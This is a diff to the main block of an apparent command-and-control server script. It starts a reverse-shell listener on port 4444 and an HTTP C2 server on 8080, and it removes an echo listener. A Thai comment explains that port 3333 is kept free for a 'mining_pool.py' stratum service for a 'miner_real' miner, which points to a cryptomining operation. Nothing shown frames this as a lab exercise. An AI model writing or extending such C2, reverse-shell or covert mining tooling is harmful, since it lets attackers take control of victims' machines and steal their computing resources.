@@ -128,8 +128,9 @@ def shell_listener(port):
 
 if __name__ == "__main__":
     threading.Thread(target=shell_listener, args=(4444,), daemon=True).start()
-    threading.Thread(target=echo_listener, args=(3333,), daemon=True).start()
-    log("[*] HTTP C2 :8080  |  reverse-shell :4444  |  echo :3333")
+    # หมายเหตุ: พอร์ต 3333 เป็นของ mining_pool.py (stratum สำหรับ miner_real)
+    # ไม่เปิด echo 3333 ที่นี่เพื่อไม่ให้แย่งพอร์ตกัน
+    log("[*] HTTP C2 :8080  |  reverse-shell :4444")
     print("[*] กด Ctrl+C เพื่อหยุด\n")
     try:
         HTTPServer(("0.0.0.0", 8080), C2Handler).serve_forever()
